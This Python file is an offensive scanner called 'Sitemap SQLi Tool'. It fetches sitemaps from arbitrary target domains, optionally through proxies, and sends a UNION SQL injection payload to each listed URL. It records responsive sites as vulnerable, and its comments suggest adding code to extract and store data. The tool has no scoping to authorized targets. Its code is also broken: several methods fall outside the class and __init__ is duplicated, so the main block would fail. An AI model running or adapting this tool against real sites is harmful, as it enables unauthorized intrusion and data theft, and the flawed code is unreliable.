import argparse
import logging
import requests
import time
import json
import csv
from bs4 import BeautifulSoup
from queue import Queue
from threading import Thread
from urllib.parse import urljoin, urlparse

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def parse_arguments():
    parser = argparse.ArgumentParser(description="Sitemap SQLi Tool")
    parser.add_argument(
        "-t",
        "--target_domains",
        nargs="+",
        required=True,
        help="List of target domains to check",
    )
    parser.add_argument(
        "-th", "--threads", type=int, default=10, help="Number of threads to use"
    )
    parser.add_argument(
        "-d", "--delay", type=int, default=1, help="Delay between requests in seconds"
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        default="vulnerable_domains.txt",
        help="Output file name",
    )
    parser.add_argument("-p", "--proxies", type=str, help="Proxies to use")
    return parser.parse_args()


class SitemapSQLiTool:
    def __init__(self, target_domains, thread_count, rate_limit_delay=1, proxies=None):
        self.target_domains = target_domains
        self.thread_count = thread_count
        self.rate_limit_delay = rate_limit_delay
        self.proxies = proxies
        self.sitemap_subdomains = []
        self.vulnerable_domains = set()  # Set to avoid duplicates
        self.queue = Queue()

    def find_sitemaps(self):
        # Worker function for threads.
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    response = requests.get(
                        f"https://{domain}/sitemap.xml", proxies=self.proxies
                    )
                    if response.status_code == 200:
                        self.sitemap_subdomains.append(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                finally:
                    self.queue.task_done()
                    time.sleep(self.rate_limit_delay)

        # Adding all domains to queue.
        for domain in self.target_domains:
            self.queue.put(domain)

        # Starting worker threads.
        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        # Waiting for all threads to finish.
        self.queue.join()
        logger.info(f"Found {len(self.sitemap_subdomains)} domains with sitemaps.")

    def test_sqli(self):
        # Worker function for threads.
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    response = self.check_sqli_vulnerability(
                        f"https://{domain}/sitemap.xml", domain
                    )
                    if response and response.elapsed.total_seconds() > 10:
                        self.vulnerable_domains.add(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                finally:
                    self.queue.task_done()
                    time.sleep(self.rate_limit_delay)

        # Adding all domains to queue.
        for domain in self.sitemap_subdomains:
            self.queue.put(domain)

        # Starting worker threads.
        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        # Waiting for all threads to finish.
        self.queue.join()

        logger.info(f"Found {len(self.vulnerable_domains)} vulnerable domains.")

    def check_sqli_vulnerability(self, url, domain):
        try:
            # Customize the SQL payload to inject specific SQL statements
            # and exploit the vulnerabilities you want to test
            payload = "' UNION SELECT column1, column2 FROM table_name -- "
            full_url = f"{url}?offset={payload}"

            response = requests.get(full_url, timeout=20, proxies=self.proxies)

            # Capture and analyze the responses to identify successful injections
            if self.is_sqli_successful(response):
                # Handle successful SQL injection
                # Modify the logic based on your specific objectives
                self.process_successful_sqli(url, domain)

            return response

        except requests.exceptions.RequestException as e:
            logger.error(
                f"An error occurred while checking SQLi vulnerability for URL {url}: {e}"
            )


def is_sqli_successful(self, response):
    # Capture and analyze the responses to identify successful injections
    # Look for specific patterns, error messages, or anomalies in the responses
    # that indicate a successful SQL injection.
    # Customize the logic based on your target application's responses
    if "Error" in response.text or "SQL syntax" in response.text:
        return True
    return False


def process_successful_sqli(self, url, domain):
    # Handle successful SQL injection
    # Modify the logic based on your specific objectives
    logger.info(f"Successful SQL injection detected for URL {url} in domain {domain}")
    # Add your custom code here to perform actions for successful injection
    # For example:
    # 1. Retrieve and process the data from the response
    # 2. Store the data in a database or file
    # 3. Trigger alerts or notifications
    # Customize the actions based on your specific requirements and objectives


def parse_sitemap(self, domain):
    try:
        # Send request to the sitemap
        response = requests.get(f"https://{domain}/sitemap.xml", proxies=self.proxies)
        response.raise_for_status()  # Raises stored HTTPError, if one occurred

        # Parse the sitemap XML
        soup = BeautifulSoup(response.content, "xml")
        urls = [url.text for url in soup.find_all("loc")]

        # Check each URL for SQLi vulnerabilities
        for url in urls:
            self.check_sqli_vulnerability(url, domain)

    except requests.exceptions.HTTPError as http_err:
        logger.error(
            f"HTTP error occurred while fetching the sitemap for domain {domain}: {http_err}"
        )
    except requests.exceptions.RequestException as req_err:
        logger.error(
            f"An error occurred while fetching the sitemap for domain {domain}: {req_err}"
        )


def __init__(self, target_domains, thread_count, rate_limit_delay=1, proxies=None):
    self.target_domains = target_domains
    self.thread_count = thread_count
    self.rate_limit_delay = rate_limit_delay
    self.proxies = proxies
    self.sitemap_subdomains = []
    self.vulnerable_domains = set()  # Set to avoid duplicates
    self.queue = Queue()


def report(self, output_file="vulnerable_domains.txt"):
    """
    Report the vulnerabilities.
    Currently, the method supports txt, json, and csv formats.
    """
    # Determine the output format from the file extension
    output_format = output_file.split(".")[-1]
    if output_format == "json":
        with open(output_file, "w") as f:
            json.dump(list(self.vulnerable_domains), f, indent=4)
    elif output_format == "csv":
        with open(output_file, "w") as f:
            writer = csv.writer(f)
            writer.writerow(["Domain"])
            for domain in self.vulnerable_domains:
                writer.writerow([domain])
    else:  # default to txt
        with open(output_file, "w") as f:
            for domain in self.vulnerable_domains:
                f.write(f"{domain}\n")

    logger.info("Vulnerabilities reported.")


if __name__ == "__main__":
    args = parse_arguments()
    proxies = {"http": args.proxies, "https": args.proxies} if args.proxies else None
    tool = SitemapSQLiTool(args.target_domains, args.threads, args.delay, proxies)
    tool.find_sitemaps()
    # Call parse_sitemap for each sitemap domain
    for domain in tool.sitemap_subdomains:
        tool.parse_sitemap(domain)
    tool.report(args.output)
